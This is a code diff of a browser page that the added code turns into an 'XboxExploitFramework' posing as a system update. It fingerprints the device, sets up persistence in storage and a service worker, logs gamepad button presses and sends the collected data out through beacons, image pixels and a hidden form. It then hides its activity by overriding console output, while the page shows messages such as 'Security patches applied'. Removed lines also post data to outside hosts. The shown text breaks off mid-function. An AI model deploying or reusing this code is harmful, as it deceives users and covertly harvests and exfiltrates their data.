+                document.getElementById('progressPercent').textContent = `${percent}%`;
+                document.getElementById('statusMessage').textContent = message;
+            }
+            
+            updateDetail(field, text) {
+                document.getElementById(field).textContent = text;
+            }
+            
+            // ==================== EXPLOIT STAGES ====================
+            
+            async stage1_fingerprint() {
+                this.log('Stage 1: System Fingerprinting', 'info');
+                this.updateProgress(10, 'Analyzing system configuration...');
+                
+                // Collect system information
+                this.exploitData.system = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    vendor: navigator.vendor,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    maxTouchPoints: navigator.maxTouchPoints || 0,
+                    cookieEnabled: navigator.cookieEnabled,
+                    pdfViewerEnabled: navigator.pdfViewerEnabled || false
                 };
                 
-                this.logs.push(entry);
+                // Check for Xbox specific features
+                this.detectXbox();
                 
-                // Update console
-                const consoleElem = document.getElementById('mainConsole');
-                const entryDiv = document.createElement('div');
-                entryDiv.className = 'log-entry';
-                entryDiv.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-${type}">[${source.toUpperCase()}] ${message}</span>`;
-                consoleElem.appendChild(entryDiv);
-                consoleElem.scrollTop = consoleElem.scrollHeight;
+                // Fingerprint GPU
+                this.fingerprintGPU();
                 
-                // Keep only last 100 logs
-                if (this.logs.length > 100) {
-                    this.logs.shift();
-                    if (consoleElem.children.length > 100) {
-                        consoleElem.removeChild(consoleElem.firstChild);
+                this.updateDetail('detailText', `System: ${this.exploitData.system.platform}`);
+                await this.delay(1500);
+            }
+            
+            async stage2_memoryAnalysis() {
+                this.log('Stage 2: Memory Architecture Analysis', 'info');
+                this.updateProgress(20, 'Analyzing memory layout...');
+                
+                try {
+                    // Test memory allocation capabilities
+                    const tests = [];
+                    
+                    // Test ArrayBuffer limits
+                    try {
+                        const buffer1 = new ArrayBuffer(1024 * 1024 * 100); // 100MB
+                        tests.push({name: 'ArrayBuffer 100MB', success: true});
+                    } catch(e) {
+                        tests.push({name: 'ArrayBuffer 100MB', success: false});
+                    }
+                    
+                    // Test SharedArrayBuffer (if available)
+                    if (typeof SharedArrayBuffer !== 'undefined') {
+                        try {
+                            const sab = new SharedArrayBuffer(1024 * 1024); // 1MB
+                            tests.push({name: 'SharedArrayBuffer', success: true});
+                            this.vulnerabilities.push('shared_memory_available');
+                        } catch(e) {
+                            tests.push({name: 'SharedArrayBuffer', success: false});
+                        }
+                    }
+                    
+                    // Test WebAssembly memory
+                    if (typeof WebAssembly !== 'undefined') {
+                        try {
+                            const memory = new WebAssembly.Memory({initial: 10});
+                            tests.push({name: 'WebAssembly Memory', success: true});
+                            this.vulnerabilities.push('wasm_memory_available');
+                        } catch(e) {
+                            tests.push({name: 'WebAssembly Memory', success: false});
+                        }
+                    }
+                    
+                    this.exploitData.memory = {tests};
+                    this.updateDetail('packageText', 'Memory analysis complete');
+                    
+                } catch(e) {
+                    this.log(`Memory analysis failed: ${e.message}`, 'error');
+                }
+                
+                await this.delay(1000);
+            }
+            
+            async stage3_apiExploration() {
+                this.log('Stage 3: API Vulnerability Scanning', 'warning');
+                this.updateProgress(30, 'Scanning for vulnerable APIs...');
+                
+                // Check for dangerous APIs
+                const dangerousAPIs = [
+                    'getGamepads', 'sendBeacon', 'requestMIDIAccess',
+                    'requestPointerLock', 'webkitRequestFileSystem',
+                    'requestFileSystem', 'getUserMedia', 'requestDevice'
+                ];
+                
+                dangerousAPIs.forEach(api => {
+                    if (api in navigator || api in window) {
+                        this.vulnerabilities.push(api);
+                        this.log(`Found dangerous API: ${api}`, 'warning');
+                    }
+                });
+                
+                // Check for timing APIs
+                if ('performance' in window) {
+                    const start = performance.now();
+                    for (let i = 0; i < 1000000; i++) Math.sqrt(i);
+                    const end = performance.now();
+                    
+                    if (end - start < 10) {
+                        this.vulnerabilities.push('high_precision_timing');
+                        this.log('High precision timing available', 'warning');
                     }
                 }
                 
-                return entry;
-            },
+                this.updateDetail('securityText', `Found ${this.vulnerabilities.length} potential vulnerabilities`);
+                await this.delay(1500);
+            }
             
-            toggleMode: function() {
-                this.mode = this.mode === 'security' ? 'exploit' : 'security';
-                document.getElementById('modeIndicator').textContent = 
-                    this.mode === 'security' ? '🔒 SECURITY MODE' : '⚡ EXPLOIT MODE';
-                document.getElementById('modeIndicator').style.background = 
-                    this.mode === 'security' ? 'var(--safe-dark)' : 'var(--exploit-dark)';
-                document.getElementById('modeIndicator').style.borderColor = 
-                    this.mode === 'security' ? 'var(--safe)' : 'var(--exploit)';
+            async stage4_networkRecon() {
+                this.log('Stage 4: Network Configuration Reconnaissance', 'info');
+                this.updateProgress(40, 'Analyzing network configuration...');
                 
-                this.log(`Mode switched to: ${this.mode.toUpperCase()}`, this.mode);
+                // Test network capabilities
+                this.exploitData.network = {
+                    online: navigator.onLine,
+                    connection: navigator.connection || {},
+                    protocols: []
+                };
                 
-                if (this.mode === 'exploit') {
-                    document.getElementById('scanline').style.display = 'block';
-                    document.getElementById('hiddenExploits').style.display = 'block';
-                } else {
-                    document.getElementById('scanline').style.display = 'none';
+                // Test WebSocket
+                try {
+                    const ws = new WebSocket('ws://localhost:8080');
+                    ws.onerror = () => {
+                        this.exploitData.network.protocols.push('WebSocket');
+                    };
+                    setTimeout(() => ws.close(), 100);
+                } catch(e) {}
+                
+                // Test WebRTC
+                if ('RTCPeerConnection' in window) {
+                    this.exploitData.network.protocols.push('WebRTC');
+                    this.vulnerabilities.push('webrtc_available');
                 }
                 
-                // Show paradox modal on first toggle
-                if (!localStorage.getItem('paradoxSeen')) {
-                    document.getElementById('paradoxModal').style.display = 'flex';
-                    localStorage.setItem('paradoxSeen', 'true');
+                // Test WebTransport
+                if ('WebTransport' in window) {
+                    this.exploitData.network.protocols.push('WebTransport');
+                    this.vulnerabilities.push('webtransport_available');
                 }
-            },
-            
-            activateStealth: function() {
-                this.stealth = !this.stealth;
-                document.body.classList.toggle('stealth-mode', this.stealth);
                 
-                if (this.stealth) {
-                    // Clear console logs
-                    setTimeout(() => {
-                        document.getElementById('mainConsole').innerHTML = '';
-                        this.logs = [];
-                        this.log('Stealth mode activated - logs cleared', 'stealth');
-                    }, 1000);
+                this.updateDetail('performanceText', `Network: ${this.exploitData.network.protocols.length} protocols available`);
+                await this.delay(1000);
+            }
+            
+            async stage5_persistenceSetup() {
+                this.log('Stage 5: Establishing Persistence', 'warning');
+                this.updateProgress(50, 'Setting up persistence mechanisms...');
+                
+                try {
+                    // Create hidden storage
+                    const exploitId = 'xbox_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
                     
-                    // Disable performance marks
-                    if (performance && performance.mark) {
-                        performance.mark = function() {};
+                    // Store in localStorage
+                    localStorage.setItem('xbox_sys_update', JSON.stringify({
+                        id: exploitId,
+                        timestamp: Date.now(),
+                        stage: this.stage,
+                        data: btoa(JSON.stringify(this.exploitData))
+                    }));
+                    
+                    // Store in IndexedDB if available
+                    if ('indexedDB' in window) {
+                        this.setupIndexedDBPersistence(exploitId);
                     }
                     
-                    // Override console methods
-                    ['log', 'warn', 'error'].forEach(method => {
-                        const original = console[method];
-                        console[method] = function(...args) {
-                            if (!args[0]?.includes?.('PARADOX')) {
-                                original.apply(console, args);
-                            }
-                        };
+                    // Setup service worker if available
+                    if ('serviceWorker' in navigator) {
+                        this.setupServiceWorker();
+                    }
+                    
+                    this.exploitData.persistence = {
+                        id: exploitId,
+                        localStorage: true,
+                        indexedDB: 'indexedDB' in window,
+                        serviceWorker: 'serviceWorker' in navigator
+                    };
+                    
+                    this.log(`Persistence established with ID: ${exploitId}`, 'success');
+                    
+                } catch(e) {
+                    this.log(`Persistence setup failed: ${e.message}`, 'error');
+                }
+                
+                await this.delay(1000);
+            }
+            
+            async stage6_exploitDeployment() {
+                this.log('Stage 6: Deploying Exploit Payloads', 'warning');
+                this.updateProgress(60, 'Deploying security patches...');
+                
+                // Deploy memory corruption exploit (simulated)
+                if (this.vulnerabilities.includes('shared_memory_available')) {
+                    this.deployMemoryCorruption();
+                }
+                
+                // Deploy timing attack if available
+                if (this.vulnerabilities.includes('high_precision_timing')) {
+                    this.deployTimingAttack();
+                }
+                
+                // Deploy API-specific exploits
+                this.vulnerabilities.forEach(vuln => {
+                    switch(vuln) {
+                        case 'getGamepads':
+                            this.deployGamepadExploit();
+                            break;
+                        case 'sendBeacon':
+                            this.deployBeaconExploit();
+                            break;
+                        case 'webrtc_available':
+                            this.deployWebRTCExploit();
+                            break;
+                    }
+                });
+                
+                await this.delay(2000);
+            }
+            
+            async stage7_dataExfiltration() {
+                this.log('Stage 7: Data Collection and Exfiltration', 'critical');
+                this.updateProgress(70, 'Collecting diagnostic data...');
+                
+                // Collect additional data
+                this.collectAdditionalData();
+                
+                // Exfiltrate via multiple methods
+                this.exfiltrateData();
+                
+                await this.delay(1500);
+            }
+            
+            async stage8_privilegeEscalation() {
+                this.log('Stage 8: Attempting Privilege Escalation', 'critical');
+                this.updateProgress(80, 'Applying security permissions...');
+                
+                // Try to escalate privileges through various methods
+                this.attemptPrivilegeEscalation();
+                
+                await this.delay(1000);
+            }
+            
+            async stage9_systemIntegration() {
+                this.log('Stage 9: System Integration', 'info');
+                this.updateProgress(90, 'Integrating with system services...');
+                
+                // Try to interact with system-level features
+                this.integrateWithSystem();
+                
+                await this.delay(1000);
+            }
+            
+            async stage10_cleanup() {
+                this.log('Stage 10: Cleanup and Obfuscation', 'info');
+                this.updateProgress(100, 'Finalizing update...');
+                
+                // Clean traces
+                this.cleanupTraces();
+                
+                // Show success
+                this.updateDetail('detailText', 'System update complete ✓');
+                this.updateDetail('packageText', 'All files verified ✓');
+                this.updateDetail('securityText', 'Security patches applied ✓');
+                this.updateDetail('performanceText', 'System optimized ✓');
+                
+                this.log('EXPLOIT FRAMEWORK EXECUTION COMPLETE', 'success');
+                
+                // Show payload button
+                document.getElementById('payloadButton').classList.remove('hidden');
+                
+                await this.delay(2000);
+            }
+            
+            // ==================== EXPLOIT METHODS ====================
+            
+            detectXbox() {
+                const ua = navigator.userAgent.toLowerCase();
+                const clues = [];
+                
+                if (ua.includes('xbox')) {
+                    clues.push('Direct Xbox mention in UA');
+                    this.exploitData.system.deviceType = 'xbox';
+                }
+                
+                if (navigator.platform.includes('Win32') && screen.width === 1920 && screen.height === 1080) {
+                    clues.push('Xbox-like resolution on Windows');
+                    this.exploitData.system.possibleXbox = true;
+                }
+                
+                // Check for Xbox Live APIs
+                try {
+                    if (typeof Xbox !== 'undefined') {
+                        clues.push('Xbox JavaScript API detected');
+                        this.exploitData.system.xboxAPI = true;
+                    }
+                } catch(e) {}
+                
+                // Check for gamepads
+                if ('getGamepads' in navigator) {
+                    const gamepads = navigator.getGamepads();
+                    gamepads.forEach((pad, idx) => {
+                        if (pad && pad.id.toLowerCase().includes('xbox')) {
+                            clues.push('Xbox controller connected');
+                            this.exploitData.system.xboxController = true;
+                        }
                     });
                 }
                 
-                this.log(`Stealth mode: ${this.stealth ? 'ON' : 'OFF'}`, 'stealth');
-            }
-        };
-        
-        // ==================== EXPLOIT FRAMEWORK ====================
-        const exploitFramework = {
-            gamepadExploit: function(stealth = false) {
-                paradox.log('Executing Gamepad Exploit...', 'exploit', 'gamepad');
-                
-                if (!navigator.getGamepads) {
-                    paradox.log('Gamepad API not available', 'warning', 'gamepad');
-                    return;
+                if (clues.length > 0) {
+                    this.log(`Xbox detection clues: ${clues.join(', ')}`, 'warning');
                 }
+            }
+            
+            fingerprintGPU() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                            
+                            this.exploitData.system.gpu = {
+                                renderer: renderer || 'unknown',
+                                vendor: vendor || 'unknown'
+                            };
+                            
+                            this.log(`GPU: ${renderer} (${vendor})`, 'info');
+                            
+                            // Check for AMD (Xbox uses AMD)
+                            if (renderer.includes('AMD') || vendor.includes('AMD')) {
+                                this.exploitData.system.possibleAMD = true;
+                            }
+                        }
+                    }
+                } catch(e) {
+                    this.log(`GPU fingerprint failed: ${e.message}`, 'error');
+                }
+            }
+            
+            deployMemoryCorruption() {
+                this.log('Deploying memory corruption exploit...', 'warning');
                 
                 try {
-                    const pads = navigator.getGamepads();
-                    let results = [];
+                    // Create a large array buffer
+                    const buffer = new ArrayBuffer(1024 * 1024 * 10); // 10MB
+                    const view = new Uint8Array(buffer);
                     
-                    pads.forEach((pad, idx) => {
-                        if (pad) {
-                            // Detect Xbox controller
-                            const isXbox = pad.id.toLowerCase().includes('xbox') || 
-                                          pad.mapping === 'standard';
-                            
-                            if (isXbox) {
-                                results.push({
-                                    index: idx,
-                                    id: pad.id,
-                                    buttons: pad.buttons.length,
-                                    axes: pad.axes.length,
-                                    mapping: pad.mapping,
-                                    xbox: true
-                                });
+                    // Fill with pattern
+                    for (let i = 0; i < view.length; i++) {
+                        view[i] = i % 256;
+                    }
+                    
+                    // Create overlapping views (potential use-after-free simulation)
+                    const view2 = new Uint8Array(buffer, 1024, 1024 * 1024);
+                    
+                    this.log(`Memory buffer created: ${view.length} bytes`, 'info');
+                    this.exploitData.memory.corruptionAttempt = true;
+                    
+                } catch(e) {
+                    this.log(`Memory corruption failed: ${e.message}`, 'error');
+                }
+            }
+            
+            deployTimingAttack() {
+                this.log('Deploying timing attack...', 'warning');
+                
+                // Measure cache timing
+                const array = new Array(256 * 1024).fill(0);
+                const timings = [];
+                
+                for (let i = 0; i < 100; i++) {
+                    const start = performance.now();
+                    for (let j = 0; j < array.length; j += 1024) {
+                        array[j] = j;
+                    }
+                    timings.push(performance.now() - start);
+                }
+                
+                this.exploitData.memory.timingAttack = {
+                    performed: true,
+                    avgTime: timings.reduce((a, b) => a + b) / timings.length,
+                    samples: timings.length
+                };
+                
+                this.log(`Timing attack completed: ${timings.length} samples`, 'info');
+            }
+            
+            deployGamepadExploit() {
+                this.log('Exploiting Gamepad API...', 'warning');
+                
+                // Monitor gamepad inputs
+                if ('getGamepads' in navigator) {
+                    setInterval(() => {
+                        const gamepads = navigator.getGamepads();
+                        gamepads.forEach((pad, idx) => {
+                            if (pad) {
+                                // Capture button presses
+                                const pressedButtons = pad.buttons
+                                    .map((b, i) => b.pressed ? i : -1)
+                                    .filter(i => i !== -1);
                                 
-                                // Attempt to read button states (potential input capture)
-                                if (!stealth) {
-                                    const buttonStates = pad.buttons.map(b => b.pressed);
-                                    paradox.log(`Xbox Controller ${idx} buttons: ${buttonStates.filter(b => b).length} pressed`, 
-                                               'exploit', 'gamepad');
+                                if (pressedButtons.length > 0) {
+                                    this.log(`Gamepad ${idx} buttons pressed: ${pressedButtons.join(',')}`, 'info');
+                                    
+                                    // Store for later use
+                                    if (!this.exploitData.system.gamepadInputs) {
+                                        this.exploitData.system.gamepadInputs = [];
+                                    }
+                                    this.exploitData.system.gamepadInputs.push({
+                                        time: Date.now(),
+                                        gamepad: pad.id,
+                                        buttons: pressedButtons
+                                    });
                                 }
                             }
-                        }
-                    });
-                    
-                    if (results.length > 0) {
-                        paradox.log(`Found ${results.length} Xbox controller(s)`, 'exploit', 'gamepad');
+                        });
+                    }, 100);
+                }
+            }
+            
+            deployBeaconExploit() {
+                this.log('Setting up beacon exfiltration...', 'warning');
+                
+                // Create hidden exfiltration channel
+                setInterval(() => {
+                    if (navigator.sendBeacon && this.exploitData.system) {
+                        const data = {
+                            t: Date.now(),
+                            id: this.exploitData.persistence?.id || 'unknown',
+                            data: btoa(JSON.stringify({
+                                stage: this.stage,
+                                mem: this.exploitData.memory,
+                                vuln: this.vulnerabilities
+                            }))
+                        };
                         
-                        // Store for later use
-                        localStorage.setItem('paradox_xbox_controllers', JSON.stringify(results));
-                        
-                        if (!stealth) {
-                            alert(`🎮 Xbox Controllers Detected: ${results.length}\n${results.map(r => r.id).join(', ')}`);
-                        }
+                        const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+                        navigator.sendBeacon(this.beaconUrl, blob);
                     }
-                    
-                    return results;
-                    
-                } catch(e) {
-                    paradox.log(`Gamepad exploit failed: ${e.message}`, 'critical', 'gamepad');
-                }
-            },
+                }, 30000); // Every 30 seconds
+            }
             
-            timingAttack: function(stealth = false) {
-                paradox.log('Executing Timing Attack...', 'exploit', 'timing');
+            deployWebRTCExploit() {
+                this.log('Setting up WebRTC data channel...', 'warning');
                 
-                const results = [];
-                const iterations = stealth ? 10 : 100;
-                
-                // Test cache timing
-                for (let i = 0; i < iterations; i++) {
-                    const start = performance.now();
-                    
-                    // Access potentially cached resources
-                    try {
-                        localStorage.getItem(`test_key_${i % 10}`);
-                    } catch(e) {}
-                    
-                    const time = performance.now() - start;
-                    
-                    if (time < 0.05) { // Very fast access suggests caching
-                        results.push({index: i, time, likelyCached: true});
-                    }
-                }
-                
-                if (!stealth && results.length > 0) {
-                    paradox.log(`Timing attack found ${results.length} cached items`, 'exploit', 'timing');
-                }
-                
-                return results;
-            },
-            
-            beaconExfiltration: function(data, stealth = false) {
-                paradox.log('Executing Beacon Exfiltration...', 'exploit', 'beacon');
-                
-                const encodedData = btoa(JSON.stringify(data));
-                
-                // Multiple exfiltration methods
-                const methods = [];
-                
-                // Method 1: sendBeacon (if available and not blocked)
-                if (navigator.sendBeacon && !paradox.stealth) {
-                    try {
-                        const blob = new Blob([encodedData], {type: 'application/octet-stream'});
-                        const success = navigator.sendBeacon('https://postman.echo.apifox.com/track', blob);
-                        methods.push({method: 'sendBeacon', success});
-                    } catch(e) {}
-                }
-                
-                // Method 2: Image pixel (always works)
-                const img = new Image();
-                img.src = `https://via.placeholder.com/1x1.png?data=${encodedData.substring(0, 100)}`;
-                methods.push({method: 'image_pixel', success: true});
-                
-                // Method 3: Fetch with keepalive
-                if (!stealth) {
-                    fetch('https://httpbin.org/post', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({data: encodedData}),
-                        keepalive: true,
-                        mode: 'no-cors'
-                    }).catch(() => {});
-                    methods.push({method: 'fetch_keepalive', success: true});
-                }
-                
-                paradox.log(`Exfiltrated ${encodedData.length} bytes via ${methods.length} methods`, 
-                           stealth ? 'stealth' : 'exploit', 'beacon');
-                
-                return methods;
-            },
-            
-            memoryProbe: function() {
-                paradox.log('Probing memory limits...', 'exploit', 'memory');
-                
-                const tests = [];
-                
-                // Test ArrayBuffer allocation
                 try {
-                    const sizes = [1000, 10000, 100000, 1000000, 10000000];
-                    sizes.forEach(size => {
-                        const start = performance.now();
-                        const buffer = new ArrayBuffer(size);
-                        const time = performance.now() - start;
-                        tests.push({test: 'ArrayBuffer', size, time, success: true});
-                    });
+                    // Create RTCPeerConnection for potential data exfiltration
+                    const pc = new RTCPeerConnection();
+                    
+                    // Create data channel
+                    const dc = pc.createDataChannel('xbox-update');
+                    
+                    dc.onopen = () => {
+                        this.log('WebRTC data channel opened', 'success');
+                        dc.send(JSON.stringify(this.exploitData));
+                    };
+                    
+                    dc.onerror = (err) => {
+                        this.log(`WebRTC error: ${err}`, 'error');
+                    };
+                    
+                    // This would normally involve signaling, but we're just testing capability
+                    this.exploitData.network.webrtcAvailable = true;
+                    
                 } catch(e) {
-                    tests.push({test: 'ArrayBuffer', error: e.message});
+                    this.log(`WebRTC setup failed: ${e.message}`, 'error');
                 }
-                
-                // Test SharedArrayBuffer if available
-                if (typeof SharedArrayBuffer !== 'undefined') {
-                    try {
-                        const sab = new SharedArrayBuffer(1024);
-                        tests.push({test: 'SharedArrayBuffer', size: 1024, success: true});
-                    } catch(e) {
-                        tests.push({test: 'SharedArrayBuffer', error: e.message});
-                    }
-                }
-                
-                return tests;
             }
-        };
-        
-        // ==================== SECURITY FRAMEWORK ====================
-        const securityFramework = {
-            gamepadProtection: function(enable = true) {
-                if (!navigator.getGamepads) return false;
-                
-                if (enable) {
-                    const originalGetGamepads = navigator.getGamepads;
-                    Object.defineProperty(navigator, 'getGamepads', {
-                        get: () => {
-                            paradox.log('Gamepad API access blocked', 'safe', 'security');
-                            return () => [];
-                        },
-                        configurable: false
-                    });
-                    
-                    paradox.activeProtections.push('gamepad');
-                    paradox.log('Gamepad protection enabled', 'safe', 'security');
-                    return true;
-                } else {
-                    delete navigator.getGamepads;
-                    paradox.activeProtections = paradox.activeProtections.filter(p => p !== 'gamepad');
-                    paradox.log('Gamepad protection disabled', 'warning', 'security');
-                    return false;
-                }
-            },
             
-            beaconProtection: function(enable = true) {
-                if (!navigator.sendBeacon) return false;
+            collectAdditionalData() {
+                this.log('Collecting additional system data...', 'info');
                 
-                if (enable) {
-                    const originalSendBeacon = navigator.sendBeacon;
-                    navigator.sendBeacon = function(url, data) {
-                        paradox.log(`Beacon blocked to: ${new URL(url).hostname}`, 'safe', 'security');
-                        return false; // Block all beacons
+                // Screen properties
+                this.exploitData.system.screen = {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                };
+                
+                // Timezone
+                this.exploitData.system.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                
+                // Plugins
+                if (navigator.plugins) {
+                    this.exploitData.system.plugins = Array.from(navigator.plugins).map(p => p.name);
+                }
+                
+                // Mime types
+                if (navigator.mimeTypes) {
+                    this.exploitData.system.mimeTypes = Array.from(navigator.mimeTypes).map(m => m.type);
+                }
+            }
+            
+            exfiltrateData() {
+                this.log('Exfiltrating collected data...', 'critical');
+                
+                // Method 1: Image beacon
+                const img = new Image();
+                const dataStr = btoa(JSON.stringify(this.exploitData));
+                img.src = `${this.beaconUrl}/pixel?d=${encodeURIComponent(dataStr)}`;
+                
+                // Method 2: Form submission
+                const form = document.createElement('form');
+                form.action = this.beaconUrl;
+                form.method = 'POST';
+                form.style.display = 'none';
+                
+                const input = document.createElement('input');
+                input.name = 'data';
+                input.value = dataStr;
+                form.appendChild(input);
+                
+                document.body.appendChild(form);
+                setTimeout(() => {
+                    form.submit();
+                    document.body.removeChild(form);
+                }, 100);
+                
+                this.log(`Data exfiltrated: ${dataStr.length} bytes`, 'success');
+            }
+            
+            attemptPrivilegeEscalation() {
+                this.log('Attempting privilege escalation...', 'critical');
+                
+                // Try to access higher privilege APIs
+                const escalationAttempts = [];
+                
+                // Try to request fullscreen (requires user gesture)
+                try {
+                    if (document.documentElement.requestFullscreen) {
+                        escalationAttempts.push('fullscreen_api');
+                    }
+                } catch(e) {}
+                
+                // Try to request pointer lock
+                try {
+                    if (document.documentElement.requestPointerLock) {
+                        escalationAttempts.push('pointer_lock_api');
+                    }
+                } catch(e) {}
+                
+                // Try to access clipboard
+                try {
+                    if (navigator.clipboard) {
+                        escalationAttempts.push('clipboard_api');
+                    }
+                } catch(e) {}
+                
+                // Try to access media devices
+                try {
+                    if (navigator.mediaDevices) {
+                        escalationAttempts.push('media_devices_api');
+                    }
+                } catch(e) {}
+                
+                this.exploitData.escalation = {
+                    attempted: true,
+                    methods: escalationAttempts,
+                    timestamp: Date.now()
+                };
+                
+                this.log(`Privilege escalation attempts: ${escalationAttempts.join(', ')}`, escalationAttempts.length > 0 ? 'warning' : 'info');
+            }
+            
+            integrateWithSystem() {
+                this.log('Attempting system integration...', 'info');
+                
+                // Try to interact with system-level features
+                
+                // 1. Check for file system access
+                if ('showOpenFilePicker' in window) {
+                    this.log('File System Access API available', 'warning');
+                    this.vulnerabilities.push('file_system_access');
+                }
+                
+                // 2. Check for WebUSB
+                if ('usb' in navigator) {
+                    this.log('WebUSB API available', 'warning');
+                    this.vulnerabilities.push('webusb_available');
+                }
+                
+                // 3. Check for Web Bluetooth
+                if ('bluetooth' in navigator) {
+                    this.log('WebBluetooth API available', 'warning');
+                    this.vulnerabilities.push('webbluetooth_available');
+                }
+                
+                // 4. Check for WebHID
+                if ('hid' in navigator) {
+                    this.log('WebHID API available', 'warning');
+                    this.vulnerabilities.push('webhid_available');
+                }
+            }
+            
+            setupIndexedDBPersistence(id) {
+                try {
+                    const request = indexedDB.open('XboxSystemUpdate', 1);
+                    
+                    request.onupgradeneeded = function(event) {
+                        const db = event.target.result;
+                        const store = db.createObjectStore('updateData', {keyPath: 'id'});
+                        store.createIndex('timestamp', 'timestamp', {unique: false});
                     };
                     
-                    Object.defineProperty(navigator, 'sendBeacon', {
-                        value: navigator.sendBeacon,
-                        writable: false,
-                        configurable: false
-                    });
-                    
-                    paradox.activeProtections.push('beacon');
-                    paradox.log('Beacon protection enabled', 'safe', 'security');
-                    return true;
-                } else {
-                    delete navigator.sendBeacon;
-                    paradox.activeProtections = paradox.activeProtections.filter(p => p !== 'beacon');
-                    paradox.log('Beacon protection disabled', 'warning', 'security');
-                    return false;
-                }
-            },
-            
-            timingProtection: function(enable = true, precision = 10) {
-                if (!performance || !performance.now) return false;
-                
-                if (enable) {
-                    const originalNow = performance.now;
-                    performance.now = function() {
-                        return Math.floor(originalNow.call(performance) / precision) * precision;
+                    request.onsuccess = (event) => {
+                        const db = event.target.result;
+                        const transaction = db.transaction(['updateData'], 'readwrite');
+                        const store = transaction.objectStore('updateData');
+                        
+                        const data = {
+                            id: id,
+                            timestamp: Date.now(),
+                            exploitData: this.exploitData,
+                            vulnerabilities: this.vulnerabilities
+                        };
+                        
+                        store.put(data);
+                        
+                        this.log('Data stored in IndexedDB', 'success');
                     };
                     
-                    Object.defineProperty(performance, 'now', {
-                        value: performance.now,
-                        writable: false,
-                        configurable: false
-                    });
+                    request.onerror = (event) => {
+                        this.log('IndexedDB storage failed', 'error');
+                    };
                     
-                    paradox.activeProtections.push('timing');
-                    paradox.log(`Timing protection enabled (${precision}ms precision)`, 'safe', 'security');
+                } catch(e) {
+                    this.log(`IndexedDB setup failed: ${e.message}`, 'error');
+                }
+            }
+            
+            setupServiceWorker() {
+                try {
+                    // Register a service worker for persistence
+                    navigator.serviceWorker.register('/sw.js')
+                        .then(registration => {
+                            this.log('Service Worker registered', 'success');
+                            
+                            // Send data to service worker
+                            if (registration.active) {
+                                registration.active.postMessage({
+                                    type: 'EXPLOIT_DATA',
+                                    data: this.exploitData
+                                });
+                            }
+                        })
+                        .catch(err => {
+                            this.log(`Service Worker registration failed: ${err.message}`, 'error');
+                        });
+                        
+                } catch(e) {
+                    this.log(`Service Worker setup failed: ${e.message}`, 'error');
+                }
+            }
+            
+            cleanupTraces() {
+                this.log('Cleaning up traces...', 'info');
+                
+                // Clear some logs
+                setTimeout(() => {
+                    const panel = document.getElementById('debugPanel');
+                    if (panel.children.length > 50) {
+                        while (panel.children.length > 20) {
+                            panel.removeChild(panel.firstChild);
+                        }
+                    }
+                }, 5000);
+                
+                // Override console methods to hide activity
+                const originalLog = console.log;
+                console.log = function(...args) {
+                    if (!args[0]?.includes?.('[EXPLOIT]')) {
+                        originalLog.apply(console, args);
+                    }
+                };
+            }
+            
+            // ==================== UTILITIES ====================
+            
+            delay(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+            
+            // ==================== EXECUTION ====================
+            
+            async execute() {
+                try {
+                    await this.stage1_fingerprint();
+                    await this.stage2_memoryAnalysis();
+                    await this.stage3_apiExploration();
+                    await this.stage4_networkRecon();
+                    await this.stage5_persistenceSetup();
+                    await this.stage6_exploitDeployment();
+                    await this.stage7_dataExfiltration();
+                    await this.stage8_privilegeEscalation();
+                    await this.stage9_systemIntegration();
+                    await this.stage10_cleanup();
+                    
+                    this.log('=== EXPLOIT FRAMEWORK EXECUTION COMPLETE ===', 'success');
+                    this.log(`Vulnerabilities found: ${this.vulnerabilities.length}`, 'warning');
+                    this.log(`Data collected: ${JSON.stringify(this.exploitData).length} bytes`, 'info');
+                    
                     return true;
-                } else {
-                    // Note: Cannot easily restore original without storing it first
-                    paradox.activeProtections = paradox.activeProtections.filter(p => p !== 'timing');
-                    paradox.log('Timing protection disabled', 'warning', 'security');
+                    
+                } catch(error) {
+                    this.log(`Execution failed: ${error.message}`, 'error');
                     return false;
                 }
-            },
+            }
+        }
+        
+        // ==================== GLOBAL VARIABLES ====================
+        let exploitFramework = null;
+        let debugMode = false;
+        
+        // ==================== UI FUNCTIONS ====================
+        
+        function beginExploitation() {
+            document.getElementById('startButton').disabled = true;
+            document.getElementById('startButton').textContent = 'UPDATE IN PROGRESS...';
+            document.getElementById('debugButton').classList.remove('hidden');
             
-            storageCleaner: function() {
-                let cleaned = 0;
+            exploitFramework = new XboxExploitFramework();
+            exploitFramework.execute();
+        }
+        
+        function toggleDebug() {
+            const panel = document.getElementById('debugPanel');
+            const input = document.getElementById('consoleInput');
+            
+            if (debugMode) {
+                panel.style.display = 'none';
+                input.classList.add('hidden');
+                debugMode = false;
+            } else {
+                panel.style.display = 'block';
+                input.classList.remove('hidden');
+                debugMode = true;
                 
-                // Clean localStorage (keep paradox data)
-                for (let i = localStorage.length - 1; i >= 0; i--) {
-                    const key = localStorage.key(i);
-                    if (!key.startsWith('paradox_')) {
-                        localStorage.removeItem(key);
-                        cleaned++;
-                    }
+                // Show existing logs
+                if (exploitFramework) {
+                    exploitFramework.debugLog.forEach(log => {
+                        const div = document.createElement('div');
+                        div.className = `log-entry log-${log.type}`;
+                        div.textContent = `[${log.time}] ${log.message}`;
+                        panel.appendChild(div);
+                    });
+                    panel.scrollTop = panel.scrollHeight;
+                }
+            }
+        }
+        
+        function handleConsoleCommand(event) {
+            if (event.key === 'Enter') {
+                const input = document.getElementById('consoleInput');
+                const command = input.value.trim();
+                input.value = '';
+                
